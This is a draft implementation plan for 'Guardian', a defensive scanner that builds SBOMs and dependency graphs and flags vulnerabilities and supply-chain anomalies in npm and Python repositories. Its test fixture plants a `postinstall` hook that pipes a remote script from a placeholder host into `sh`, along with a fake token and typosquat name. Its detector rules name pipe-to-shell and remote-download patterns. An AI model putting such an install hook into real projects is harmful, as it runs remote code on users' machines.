# Guardian: Combined Implementation Plan (Day 1)

**Status:** draft for team review · **Not committed**
**Sources merged:** `docs/stage1and2.md` (fact collection + code index), `docs/multilayer_dependency_graph.md` (three-layer graph), `2026-11-23-guardian-day1.md` (orchestrator, detectors, verifier, UI), and the Bosch Day 1 image.

> Day 1 checkpoint: **"Show us what is in the application, what changed, and what appears risky."**
> Day 1 is about visibility and detection. Remediation is Day 2.

---

## 1. Goal and scope

Paste a public GitHub URL, get:

1. an inventory of components (direct and transitive) with versions and origin,
2. a cross-checked CycloneDX SBOM and a multi-layer dependency graph,
3. known vulnerabilities with severity, fixed version and the dependency path that introduced them,
4. suspicious supply-chain changes (non-CVE signals) with evidence,
5. an evidence-backed report with a risk level per finding, shown in a dashboard.

**In scope:** npm and Python repos. Dockerfile, docker-compose and GitHub Actions inspection. Full Python code index (`ast`). Basic JavaScript import extraction.
**Out of scope for Day 1:** Java and other ecosystems, Neo4j, trained models, embeddings, remediation, VEX generation.

---

## 2. Image-to-pipeline mapping

| Image column | Requirement | Stage that delivers it |
|---|---|---|
| 1 Discover components | manifests, lockfiles, direct + transitive, names + versions | S1 Facts, S2 Resolve |
| 2 Supply chain view | SBOM, dependency graph, origin, container image or CI/CD | S2 SBOM, S4 Graph, S1 Docker/CI |
| 3 Vulnerabilities | CVE, severity, fixes, transitive trace to source | S6 Detectors (OSV), S4 paths |
| 4 Suspicious changes | at least one anomaly (unexpected dependency, typosquat, install script, untrusted image, modified lockfile) | S6 Detectors |
| 5 Present evidence | component, dependency path, evidence, risk level | S7 Correlate, S8 Agent, S9 Report/UI |

---

## 3. Ground rules

1. **Never execute the target repo's code on the host.** Parse statically. Any install or resolution runs in a throwaway Docker container with `--ignore-scripts`.
2. **Record facts, never judge** in S1 to S3. Judging happens in S6 and later.
3. **Every fact carries evidence**: file path + line, and commit hash where relevant.
4. **Every record says how it was found** (`discovered_by`: manifest, lockfile, pip-report, syft, trivy, pypi, npm-registry, git, ast, yaml, dockerfile, osv, ai).
5. **Stable IDs**: package = PURL (`pkg:pypi/pyyaml@6.0.1`), file = repo-relative path, function/class = `path::qualname`.
6. **Never read or store secret values.** Names, locations, sha256 and a redacted preview only.
7. **Fail soft.** A broken file or network error becomes an `errors[]` entry or a `degraded` node, never a crash.
8. **Unknown stays unknown.** Missing data yields explicit `unknown` or `unsupported_offline`, never a silent downgrade.
9. **Raw evidence is immutable and append-only.** LLM output lives in separate claim tables.
10. **Hash every file (sha256)** so re-scans only redo changed files.
11. **Static imports are evidence of reference, not proof of runtime use.** Dynamic imports are recorded as known unknowns.

---

## 4. Pipeline

```
Repo URL
  |
[S0 Ingest]            clone at fixed commit, URL validation, size limit
  |
[S1 Facts]             manifests, lockfile health, extra indexes, install scripts,
  |                    Dockerfile, CI, compose, config var names, git history, docs
  |
[S2 Resolve + SBOM]    lockfile first, sandbox resolution otherwise,
  |                    Syft + Trivy cross-check, registry origin metadata
  |
[S3 Code index]        Python: full ast index. JS: imports only.
  |                    import name -> distribution map
  |
[S4 Unified graph]     NetworkX, three layers, evidence per edge,
  |                    validation, discrepancies, metrics, per-commit snapshots
  |
  +--> [S6 Detectors, parallel]
  |      vulns (OSV/KEV/EPSS) | change + history | install scripts
  |      typosquat | container/CI rules | secrets
  |
[S7 Correlate + score]   dedupe, attack class, P0-P3 band with reason
  |
[S8 Evidence Agent + Verifier]   bounded LLM, read-only tools, claims checked
  |
[S9 Report + API + UI]
```

A LangGraph supervisor orchestrates S1 onward. It routes by a deterministic table (no LLM call on Day 1), for example "no Dockerfile and no CI means skip container/CI detector, reason recorded".

---

## 5. Stack

| Purpose | Tool |
|---|---|
| Language | Python 3.12, Windows 11 must work (`pathlib`, subprocess with argument lists) |
| Contracts | Pydantic v2 (only cross-module contract) |
| Orchestration | LangGraph + SQLite checkpointer |
| Graph | NetworkX |
| SBOM | Syft + Trivy, CycloneDX 1.5 JSON |
| Manifest parsing | `packaging`, `tomllib`, JSON, PyYAML |
| Resolution | lockfiles; sandboxed `npm install --package-lock-only --ignore-scripts`; `pip install --dry-run --ignore-installed --only-binary=:all: --report` in Docker |
| Origin metadata | PyPI JSON API, npm registry (cached, offline mode) |
| Code parsing | stdlib `ast` (Python); regex/lightweight parser for JS imports |
| Git history | `git` subprocess (`git show <hash>:<file>`, no checkout) |
| Vulnerability data | OSV API (+ CISA KEV, EPSS), cached |
| Storage | SQLite run store + JSON artifacts per run |
| API | FastAPI + SSE |
| UI | React + TypeScript + Vite + Tailwind + Cytoscape.js |
| Tests | pytest, Vitest |

---

## 6. Folder structure

```
pyproject.toml
src/guardian/
  models.py  purl.py  store.py  runner.py  context.py
  ingest.py
  cartographer/   facts.py lockfile_health.py docker.py ci.py gitsig.py
                  manifests_py.py index_config.py history.py docs.py config_inventory.py
  sbom/           lockfiles.py cyclonedx.py tools.py resolve.py stage.py pypi_meta.py npm_meta.py
  codeindex/      parser.py visitors.py import_resolver.py call_resolver.py
                  data_access.py patterns.py dist_map.py coverage.py js_imports.py
  graph.py        validate.py discrepancies.py
  detectors/      osv.py enrich.py vulns.py lockdiff.py scripts.py names.py registry.py
                  container.py ci_rules.py secrets.py
  correlate.py  scoring.py
  llm.py  dossier.py
  agent/          tools.py verifier.py investigate.py
  orchestrator.py
  report.py  api.py
data/   attack_map.yaml  eol.yaml  popular_npm.txt  popular_pypi.txt
scripts/  make_fixture.py  measure.py  precompute_demo.py  fetch_popular.py
tests/  web/  docs/  prompts/  rules/  eval/
```

---

## 7. Stage specifications

### S0. Ingest
- `parse_repo_url` accepts `.git`, trailing slash, `/tree/<branch>`; rejects non-GitHub hosts, missing repo part, path traversal (`InvalidRepoUrl`, never a clone attempt).
- `git clone --depth 50 --no-tags`, max 500 MB (`RepoTooLarge`).
- Output `RepoRef(url, owner, name, branch, commit, license, clone_path, history_available)`.

### S1. Facts (`facts.json`)
- **Declared dependencies:** name, spec, extras, markers, kind (`registry` | `vcs` | `url` | `path`), dev or runtime, source file + line; follows `-r` and `-c` includes. Covers `package.json`, `requirements*.txt`, `pyproject.toml`, `setup.cfg`, `Pipfile.lock`, `poetry.lock`, `uv.lock`.
- **Package indexes:** `--index-url`, `--extra-index-url`, `[[tool.poetry.source]]`, `[[tool.uv.index]]`, `.npmrc` registries. An extra private index is recorded as a fact (dependency-confusion path).
- **Lockfile health:** present, committed, ignored by (`.npmrc package-lock=false`), version, integrity hashes, in sync with manifest.
- **Lifecycle scripts:** `preinstall`, `install`, `postinstall`, `prepare` (npm); `setup.py` presence (Python).
- **Dockerfile:** stages, base image tag and digest, `USER`, exposed ports, `RUN pip/npm install`, remote `ADD`, `curl|wget` in `RUN`.
- **CI:** triggers, `permissions`, every `uses:` with `pinned_to_sha`, every `run:` line, secret names referenced. Handle PyYAML's `on` parsed as boolean.
- **Compose:** services, images (tag/digest), ports, `depends_on`.
- **Config inventory:** `.env*` variable names only, settings and config files, migration folders.
- **Git history:** last 50 commits touching dependency files, lockfiles, Dockerfiles, workflows; per commit diff of the package list (added, removed, version changed); ability to build a snapshot at any commit via `git show`.
- **Docs:** README and docs paths, first ~2,000 characters only.
- Skips `.git`, `node_modules`, `vendor`, `dist`, `build`, `venv`; manifest cap of 200 with a recorded error.

### S2. Resolve and SBOM (`sbom.cdx.json`)
- Lockfile present: parse it (npm v1 and v2/v3, requirements pins, poetry/uv/Pipfile locks). No install needed.
- Lockfile absent: sandboxed resolution in Docker, flagged `resolved_not_committed`, confidence `medium`.
- Syft and Trivy both generate CycloneDX; `cross_check` reports Jaccard overlap and the packages only one tool saw. Both OK + lockfile = high, one failed or no lockfile = medium, both failed = low (native parse).
- If a container image is built or available, also scan it (image-column requirement).
- Origin metadata per package: upload date of the version, first release, release count, maintainers, project URLs, yanked, sdist-only, registry, resolved URL, integrity hash (compared with lockfile hash), install-script flag.
- Output validates against CycloneDX 1.5.

### S3. Code index (`code_index.json`, Python via `ast`)
Per file: `path`, `module_path`, `sha256`, `loc`, `is_test`, `parse_error`, and:

| Field | Content |
|---|---|
| `imports[]` | name, alias, line, kind (`internal`/`external`/`stdlib`), `resolved_file`, `in_try_except`, `conditional` |
| `definitions[]` | id (`path::qualname`), type, line, end_line, decorators, params, returns, docstring |
| `calls[]` | caller, alias-resolved target (`y.load` -> `yaml.load`), kind, line, `resolved_target` for internal calls |
| `routes[]` | Flask, FastAPI, Django route decorators and `urls.py` |
| `cli_entrypoints[]` | `__main__`, click/typer, argparse, `[project.scripts]` |
| `input_sources[]` | `request.json/.args/.form/.files`, FastAPI params, Django `request.POST/.GET`, CLI args |
| `env_reads[]` | `os.environ[...]`, `os.environ.get`, `os.getenv` (names only) |
| `db_models[]`, `db_access[]` | SQLAlchemy and Django models; read, write and raw SQL operations |
| `external_services[]` | SDK table (`stripe`, `boto3`, `twilio`, `openai`, `sendgrid`...) plus URL domains |
| `sensitive_calls[]` | `network`, `subprocess`, `code_exec`, `deserialize`, `file_write`, `crypto` |
| `string_urls[]`, `dynamic_imports[]` | URL literals; `importlib.import_module`, `__import__` (known unknowns) |

Repo-level: `source_roots`, `import_name_to_distribution` (from resolved environment plus fallback table: `yaml->PyYAML`, `cv2->opencv-python`, `sklearn->scikit-learn`, `PIL->Pillow`), `coverage` (files parsed/failed, internal calls resolved/unresolved, dynamic imports), `errors[]`.
JavaScript: `import`/`require` extraction only on Day 1, mapped to npm package names. Full JS call graph is out of scope.

### S4. Unified graph
One NetworkX graph, one snapshot per commit.

- **Nodes:** `Project`, `Package`, `Artifact` (exact version, PURL), `SourceModule`, plus `Dockerfile`, `Workflow`, `ComposeService` for supply-chain context.
- **Edges:** `DECLARES` (Project -> Package), `HAS_ARTIFACT` (Package -> Artifact), `DEPENDS_ON` (dependent -> dependency), `IMPORTS` (SourceModule -> Package, with line and mapping status).
- **Edge evidence status:** `verified` (lockfile or package manager), `declared`, `registry-derived`, `statically-observed`, `unknown`. No single confidence percentage; show counts and reasons.
- **Validation:** unique identities, PURL format, dangling edges, orphans (investigate, not error), cycles, version consistency.
- **Discrepancy table:** declared-not-resolved, resolved-not-imported, imported-not-declared, declared+resolved+imported, vulnerable+imported, vulnerable-not-imported.
- **Metrics:** depth from nearest direct dependency, fan-in, fan-out, `paths_to(purl)` from direct dependencies (cycle-safe, capped).
- **Time travel:** graph diff between two commits from S1 history snapshots.

### S6. Detectors (parallel, rule-based)
| Detector | Output |
|---|---|
| Vulnerabilities | OSV `querybatch` by PURL, advisory ID, aliases, CVSS (vector converted to score), severity band, fixed versions, KEV, EPSS, dependency path, scope; alias dedupe |
| Lockfile and history changes | integrity changed with same version (strong), resolved host changed or non-registry source (strong), new dependency, large version jump (weak); baseline commit raises nothing |
| Install scripts | presence (weak); pipe-to-shell, base64 decode, eval, remote download (strong) |
| Name confusion | edit distance <= 2 against popular names, benign filter (repo URL, >5 versions, age > 1 year, >= 2 maintainers); weak without registry metadata, strong with suspicious metadata |
| Container | `DF001` latest tag, `DF002` no digest, `DF003` root user, `DF004` remote ADD, `DF005` pipe-to-shell, `DF006` unpinned global install, `DF007` EOL base |
| CI | `CI001` unpinned action, `CI002` `pull_request_target`, `CI003` broad or missing permissions, `CI004` script injection via `github.event.*` |
| Secrets | GitHub tokens, AWS keys, private-key headers; store location + sha256 + redacted preview only |

Findings are classified `S` (strong signal), `C` (contextual) or `W` (weak signal). Nothing is labelled "malware".

### S7. Correlate and score
- Dedupe by finding ID, merge evidence, assign attack class from `data/attack_map.yaml`.
- Priority bands `P0` to `P3` plus `Unprioritized`, first matching rule wins (examples: KEV is P0; High + reachable + prod + network-facing is P0; High + prod + unknown reachability is P1; High + dev only is P2; missing severity is `Unprioritized` with reason).
- Thresholds are unvalidated starting values and must be labelled so in the UI and report.

### S8. Evidence Agent and Verifier
- Dossier: app type and exposure, built by rules first; an LLM may enrich it. Repo text is fenced in `<repo_data>` and treated as untrusted.
- Agent budget: 8 read-only tool calls, 2 repair passes. Tools: `read_file`, `grep_repo`, `get_dep_path`, `get_lockfile_entry`, `git_log`, `get_advisory`, `get_scope`. All path-confined to the clone, no shell, secrets redacted.
- Claim types: `fact` (only raw evidence), `inference`, `unknown`.
- Verifier (deterministic): evidence ID exists, backtick-quoted terms appear in cited excerpts, `fact` citing derived evidence is downgraded. Rejected claims are removed and counted in notes.
- If the LLM is unavailable or returns invalid JSON after one repair, a rule-based explanation is generated from the finding's signals.

### S9. Report, API and UI
- `report.json` (`schema_version: "1.0"`): `repo, dossier, inventory, sbom, graph, findings, explanations, coverage{node_status, degraded, unsupported}, integrity{artifact_sha256}`, plus empty Day 2 keys `remediation`, `validation`, `vex`.
- API: `POST /runs`, `GET /runs/{id}`, `/events` (SSE), `/report`, `/evidence/{id}`, `/graph`, `/sbom`. A `--demo` mode serves precomputed runs offline.
- UI pages: Submit, Progress (degraded nodes visible), Dossier, Inventory/SBOM, Graph (layer selector: all / declared / resolved / usage; expand, collapse, trace path, search, filter by scope, show evidence, show discrepancy; commit slider), Findings (band, class and axis chips as text, not colour only), Evidence drawer, Coverage panel.

---

## 8. Data contracts (shared first, all four agree)

`Evidence`, `Origin`, `Component`, `DepEdge`, `LockfileHealth`, `RepoRef`, `RepoFacts`, `Finding`, `Claim`, `Explanation`, `Dossier`, `NodeStatus`, plus `CodeIndexFile` and `CodeIndexCoverage` for S3. `RunContext(repo, facts, components, edges, graph, store, runner, dossier)` is passed to every detector as `detect_xxx(ctx) -> list[Finding]`.
`RunStore` is SQLite with `BEFORE UPDATE/DELETE` triggers on the `evidence` table. Evidence IDs are content-addressed (`ev_<10 hex>`). Every external call (OSV, registries, EPSS, KEV, LLM) goes through a cache with offline mode.

---

## 9. Test fixture: `guardian-fixture` (build first, doubles as demo)

Git repo with 5 commits: (1) clean baseline; (2) dependency with major version jump; (3) lockfile `integrity` changed, same version; (4) `resolved` pointing at `http://deps.example.invalid/...`; (5) `postinstall` with `curl http://x.invalid/a.sh | sh`.
Plus: a never-published name-confusion dependency (`lodahs`), a Dockerfile (`FROM node:latest`, no `USER`, remote `ADD`), a workflow (tag-pinned action, `pull_request_target`, `permissions: write-all`), a clearly fake token, an old transitive dependency with a known OSV advisory (verify against OSV first), and a Flask-style Python slice for the code index (route with `request.json`, `yaml.load`, an env read, an ORM write, an external service call, a declared-but-never-imported package).
Real-world checks: NodeGoat (lockfile present), Juice Shop (lockfile absent), plus two real Flask/FastAPI repos of 50 to 300 files for the code index.

---

## 10. Ownership and timeline

| Owner | Work | Hours |
|---|---|---|
| All, M1 drives | Contracts, PURL, run store (Task 1) | 0 to 0.5 |
| M2 | S0 Ingest, S1 Facts (incl. Python manifests, indexes, history), S2 lockfile parsers + CycloneDX + Syft/Trivy + resolution, S4 graph | 0.5 to 5 |
| M3 | S6 detectors, then LLM client, Dossier, tools, Verifier, Evidence Agent | 0.5 to 6.5 |
| M4 | Fixture + quality harness, UI core and views, docs and demo cache | 0.5 to 8 |
| M1 | S7 correlator and scoring, orchestrator, report and API | 0.5 to 6 |
| Code index (S3) | Split: M2 takes imports, definitions, calls, dist map; M3 takes data access, routes, input sources, sensitive calls once detectors are stable | 2.5 to 6 |

**Milestones:** H2 stub end-to-end run. H4 real pipeline on NodeGoat with vulnerabilities, one non-CVE signal, one container or CI finding. H6 full flow, Verifier rejects the seeded lie, code index on fixture. H8 frozen, demo rehearsed twice.

---

## 11. Definition of done

- [ ] URL in, report out with no manual step, on NodeGoat, Juice Shop and the fixture.
- [ ] SBOM validates against CycloneDX 1.5; Syft/Trivy agreement shown; lockfile-absent case labelled `resolved_not_committed`.
- [ ] Graph shows declared, resolved and usage layers with discrepancy view and path tracing.
- [ ] At least one vulnerability with advisory ID, severity, fixed version and dependency path (confirm on NodeGoat before the hackathon).
- [ ] All planted fixture signals detected; recall and extra findings written to `eval/fixture_report.json`.
- [ ] Code index finds the planted route, input source, call chain, env read, DB write, external service, `yaml.load`, and the unused declared package.
- [ ] Code index runs on 2 real Flask/FastAPI repos without crashing; errors land in `errors[]`; `coverage` block present.
- [ ] Every displayed claim links to evidence; seeded false claim rejected end to end.
- [ ] Killing Syft, Trivy, OSV and the LLM each yields a degraded banner and a complete report.
- [ ] Coverage panel lists unsupported attack classes.
- [ ] All JSON validates against the Pydantic models; `pytest -q` and `npm test` green.
- [ ] Re-scan of an unchanged repo is fast (sha256 cache).

---

## 12. Cut order if behind

1. Full code index features beyond imports, definitions and calls (data access, input sources first to go).
2. Graph/SBOM UI pages (keep tables).
3. Juice Shop demo (keep NodeGoat + fixture).
4. Evidence Agent repair passes (keep one pass + Verifier).
5. LLM triage of install scripts (stay rule-based).

**Never cut:** contracts and store, ingest, facts, lockfile parsing, SBOM, graph, OSV vulnerabilities, correlator, orchestrator, Verifier, fixture, one non-CVE detector, rule-based Dossier.

---

## 13. Risks

| Risk | Mitigation |
|---|---|
| Scope: code index adds a third parallel workstream | Imports, definitions and calls first; rest behind the cut order |
| npm-centric parsers vs Python-centric code index | Both ecosystems tested on the fixture; Python manifests owned explicitly by M2 |
| OSV, registry or LLM outage during demo | Cache + offline mode, `--demo` mode with replayed LLM |
| Static analysis overclaims | UI wording: "statically referenced", coverage shows resolved vs unresolved |
| Hostile text in repos (prompt injection, fake secrets) | Fenced prompts, read-only confined tools, redaction, Verifier |
